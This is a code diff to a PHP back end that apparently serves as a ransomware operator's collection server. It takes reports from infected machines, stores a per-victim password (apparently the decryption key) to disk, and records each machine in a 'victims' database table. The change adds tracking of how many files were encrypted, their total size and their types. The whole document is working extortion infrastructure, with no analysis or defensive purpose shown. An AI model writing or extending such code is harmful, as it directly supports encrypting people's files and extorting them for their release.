@@ -33,6 +33,9 @@ $systemid       = $_POST['systemid']       ?? '';
 $location       = $_POST['location']       ?? '';
 $ip             = $_POST['ip']             ?? '';
 $password       = $_POST['password']       ?? '';
+$encrypted_count = intval($_POST['encrypted_count'] ?? 0);
+$encrypted_size  = intval($_POST['encrypted_size']  ?? 0);
+$encrypted_types = $_POST['encrypted_types'] ?? '';
 
 // 安全文件名
 $safe_machine  = sanitize_filename($machine_name);
@@ -55,19 +58,22 @@ file_put_contents($target_dir . '/' . $file, $password);
 
 // PDO预处理插入
 $stmt = $pdo->prepare(
-    'INSERT INTO victims (machine_name, computer_user, os, date, time, ip, location, systemid, password)
-     VALUES (:machine_name, :computer_user, :os, :date, :time, :ip, :location, :systemid, :password)'
+    'INSERT INTO victims (machine_name, computer_user, os, date, time, ip, location, systemid, password, encrypted_count, encrypted_size, encrypted_types)
+     VALUES (:machine_name, :computer_user, :os, :date, :time, :ip, :location, :systemid, :password, :encrypted_count, :encrypted_size, :encrypted_types)'
 );
 $stmt->execute([
-    ':machine_name'  => $machine_name,
-    ':computer_user' => $computer_user,
-    ':os'            => $os,
-    ':date'          => $date,
-    ':time'          => $time,
-    ':ip'            => $ip,
-    ':location'      => $location,
-    ':systemid'      => $systemid,
-    ':password'      => $password,
+    ':machine_name'    => $machine_name,
+    ':computer_user'   => $computer_user,
+    ':os'              => $os,
+    ':date'            => $date,
+    ':time'            => $time,
+    ':ip'              => $ip,
+    ':location'        => $location,
+    ':systemid'        => $systemid,
+    ':password'        => $password,
+    ':encrypted_count' => $encrypted_count,
+    ':encrypted_size'  => $encrypted_size,
+    ':encrypted_types' => $encrypted_types,
 ]);
 
 echo 'handshake completed';
